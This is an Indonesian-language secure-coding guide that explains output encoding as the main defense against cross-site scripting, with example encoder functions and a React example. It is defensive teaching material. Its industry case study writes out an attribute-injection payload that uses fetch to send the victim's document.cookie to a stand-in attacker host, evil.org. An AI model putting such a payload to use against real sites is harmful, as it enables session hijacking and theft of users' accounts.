# Output Encoding

## 1. Skenario Sistem Nyata

Sebuah aplikasi perbankan menampilkan nama pemilik rekening di header dashboard setelah login:
"Selamat Datang, Budi Santoso!"

Seorang nasabah mendaftarkan nama perusahaannya dengan nilai:
`PT. Maju <script>alert('hack')</script>`

Jika backend atau frontend menyisipkan nama tersebut langsung ke dalam string HTML:
`document.getElementById('user-name').innerHTML = 'Selamat Datang, ' + userData.name;`

Maka browser akan memperlakukan karakter `<` dan `>` sebagai tag HTML pembuka dan penutup, sehingga skrip alert langsung tereksekusi.

Namun, jika aplikasi menerapkan **Output Encoding**:
Karakter `<` diubah menjadi `&lt;` dan `>` diubah menjadi `&gt;`.
Browser akan membaca string `&lt;script&gt;` dan merendernya murni sebagai teks tulisan visual di layar, tanpa pernah menjalankannya sebagai instruksi kode pemrograman.

## 2. Apa Itu dan Buat Apa?

Output Encoding (sering disebut *Contextual Output Escaping*) adalah proses mengubah karakter khusus yang bermakna ganda (karakter kontrol) menjadi format representasi data yang aman sebelum data tersebut disisipkan ke dalam konteks keluaran tertentu (seperti HTML body, atribut HTML, JavaScript block, URL, atau CSS).

Tujuan utamanya adalah mempertahankan pemisahan tegas antara **Data** (apa yang ingin ditampilkan) dan **Kode** (apa yang harus dieksekusi oleh mesin browser).

Output Encoding adalah pertahanan nomor satu dan paling mendasar dalam mencegah kerentanan Cross-Site Scripting (XSS).

## 3. Kenapa Harus Pakai Ini?

- **Input Bersih Bisa Jadi Berbahaya**: Banyak developer salah kaprah berpikir bahwa jika input sudah divalidasi di form pendaftaran, maka data tersebut otomatis aman. Karakter seperti `'`, `"`, `<`, `>`, `&` adalah karakter sah dalam nama orang (misal: *O'Connor* atau *AT&T*). Jika kita melarang karakter tersebut di input, UX pengguna akan rusak.
- **Kontekstual**: Encoding harus disesuaikan dengan tempat di mana data akan ditaruh:
  1. *HTML Body Context*: Mengubah `&`, `<`, `>`, `"`, `'` menjadi `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`.
  2. *HTML Attribute Context*: Mencegah user keluar dari pembungkus tanda kutip (`<input value="${data}">`).
  3. *JavaScript Context*: Menggunakan encoding heksadesimal Unicode (`\u0022`) agar user tidak bisa menutup string literal (`const name = "${data}";`).
  4. *URL Query Context*: Menggunakan `encodeURIComponent()` agar karakter spasi, `&`, dan `#` tidak merusak parameter routing HTTP.

## 4. Cara Kerjanya

Berikut adalah diagram alur bagaimana karakter khusus ditransformasikan berdasarkan konteks tujuannya:

```
[ Data Mentah Tidak Terpercaya ] -> Nama: "O'Connor <admin>"
                     |
                     +-------------------------------+-------------------------------+
                     |                               |                               |
             (Konteks: HTML Body)          (Konteks: HTML Atribut)           (Konteks: URL Param)
                     |                               |                               |
                     v                               v                               v
             Transformasi Entitas:           Transformasi Atribut:           URL Component Encoding:
             <  ---> &lt;                    <  ---> &lt;                    <  ---> %3C
             >  ---> &gt;                    >  ---> &gt;                    >  ---> %3E
             '  ---> &#x27;                  '  ---> &#x27;                  '  ---> %27
             &  ---> &amp;                   "  ---> &quot;                  Spasi -> %20
                     |                               |                               |
                     v                               v                               v
       [ Hasil Render di Browser ]      [ Hasil Render di Browser ]      [ Hasil URL di Browser ]
         "O&#x27;Connor &lt;admin&gt;"    <input value="O&#x27;Connor">    https://app.com?q=O%27Connor
                     |                               |                               |
                     v                               v                               v
       (Browser menampilkan teks visual murni di layar, TIDAK ADA KODE YANG DIEKSEKUSI)
```

## 5. Cuplikan Logika Inti

### Fungsi Konversi HTML Entity Encoding di TypeScript

Jika Anda bekerja dengan Vanilla JavaScript atau Web Components:

```typescript
// frontend/src/utils/security.ts

// 1. HTML Body & Attribute Encoding
export function encodeHtml(rawString: string): string {
  const entityMap: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };

  return String(rawString).replace(/[&<>"'/]/g, (char) => entityMap[char]);
}

// 2. JavaScript String Context Encoding (untuk disuntikkan ke skrip)
export function encodeJsString(rawString: string): string {
  return String(rawString).replace(/[^\w. ]/gi, (char) => {
    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
  });
}

// 3. URL Parameter Encoding Aman
export function buildSafeUrl(baseUrl: string, params: Record<string, string>): string {
  const url = new URL(baseUrl);
  Object.entries(params).forEach(([key, value]) => {
    // encodeURIComponent meng-escape karakter kontrol URL seperti ?, &, =, #
    url.searchParams.append(key, value);
  });
  return url.toString();
}
```

### Praktik Terbaik di Framework Modern (React JSX)

Framework modern seperti React, Vue, dan Angular secara otomatis menerapkan context-aware output encoding untuk teks biasa:

```tsx
// React secara otomatis melakukan HTML encoding pada variabel di dalam JSX
export function SafeGreeting({ userName }: { userName: string }) {
  // Jika userName adalah "<script>alert(1)</script>", React merendernya
  // sebagai string &lt;script&gt;alert(1)&lt;/script&gt; di DOM.
  return (
    <div className="user-profile">
      <h1>Selamat Datang, {userName}</h1>
    </div>
  );
}
```

## 6. Kelebihan dan Kekurangan (Trade-offs)

| Kelebihan | Kekurangan / Risiko |
| :--- | :--- |
| Zero-dependency, performa eksekusi sangat cepat (native string replace) | Tidak mempertahankan format gaya teks (tag `<b>` akan ditampilkan mentah sebagai huruf `<b>`) |
| Solusi paling fundamental dan efektif memutus mata rantai eksploitasi XSS | Kesalahan pemilihan konteks (misal menggunakan HTML encoder untuk JavaScript block) tetap bisa dibobol |
| Di-handle secara otomatis oleh sebagian besar template engine frontend modern | Developer tetap bisa ceroboh jika menggunakan fungsi escape bypass (`dangerouslySetInnerHTML`) |

## 7. Kapan Harus Pakai vs Kapan Jangan Pakai

### Kapan Harus Selalu Pakai
- Setiap kali menampilkan data dari database, API, atau input form ke dalam elemen HTML biasa.
- Menyematkan variabel data dinamis ke dalam atribut HTML (seperti `title`, `alt`, `data-*`, `placeholder`).
- Menyusun URL dengan parameter query dinamis via `encodeURIComponent()`.

### Kapan Tidak Cukup (Perlu Sanitasi)
- Konten artikel blog, ulasan, atau forum yang memang harus menampilkan format teks kaya (*Rich Text HTML*). Gunakan **Input Sanitization** (DOMPurify) untuk kasus ini.

## 8. Metrik Kunci & Observabilitas

1. **Unescaped DOM Sinks Audits**: Jalankan static analysis tool (seperti ESLint plugin `eslint-plugin-react` rule `no-danger`) untuk mendeteksi pemanggilan `dangerouslySetInnerHTML` tanpa encoding/sanitasi.
2. **Broken UI Escaping Reports**: Pantau tiket komplain dari user terkait karakter khusus yang rusak (misal nama `D'Angelo` tampil sebagai `D&amp;#x27;Angelo` akibat kesalahan double encoding).

## 9. Studi Kasus Industri Nyata

Sebuah platform periklanan online memiliki fitur pratinjau teks iklan. Pengguna mengetik teks headline iklan, lalu frontend menampilkan preview di layar:

`<input type="text" id="headline-input" value="${ad.headline}">`

Penyerang memasukkan headline berikut:
`Sepatu Keren" onfocus="fetch('https://evil.org/log?cookie='+document.cookie)" autofocus="`

Ketika dirender tanpa attribute encoding, string tanda kutip dua (`"`) menutup atribut `value`, lalu atribut `onfocus` dan `autofocus` terinjeksi ke dalam tag `<input>`. Saat halaman dibuka, input otomatis mendapatkan fokus dan mengirimkan cookie korban ke penyerang.

Perbaikan yang diterapkan:
Mengganti string template manual dengan manipulasi properti DOM native:
`inputElement.value = ad.headline;` (Browser secara native meng-handle value tanpa interpretasi atribut HTML), serta meng-encode tanda kutip dua menjadi `&quot;` pada server-side template.

## 10. Fakta Menarik & Gotchas Production

- **Double Encoding Trap**: Jangan melakukan encoding dua kali pada data yang sama. Jika string `O'Connor` di-encode menjadi `O&#x27;Connor`, lalu di-encode lagi, hasilnya akan menjadi `O&amp;#x27;Connor` yang membuat tampilan di layar berantakan.
- **Konsep Browser Sink**: Menggunakan `element.textContent` atau `element.innerText` secara otomatis melakukan encoding teks. Hanya gunakan properti ini alih-alih `element.innerHTML` jika Anda hanya ingin menampilkan teks polos.
- **JSON Serialization Bukan JavaScript Escaping**: Melakukan `JSON.stringify()` ke dalam tag `<script>var data = ${JSON.stringify(obj)};</script>` tetap rentan terhadap XSS jika objek mengandung string `</script>`. Gunakan serialization yang aman terhadap HTML entity seperti `serialize-javascript`.

## 11. Rangkuman Singkat

Output Encoding adalah teknik pengubahan karakter kontrol menjadi representasi entitas aman sebelum dirender ke layar, memastikan browser memperlakukan input pengguna murni sebagai data tekstual dan bukan instruksi kode. Terapkan encoding sesuai konteks (HTML body, atribut, URL, JavaScript) untuk mencegah XSS.
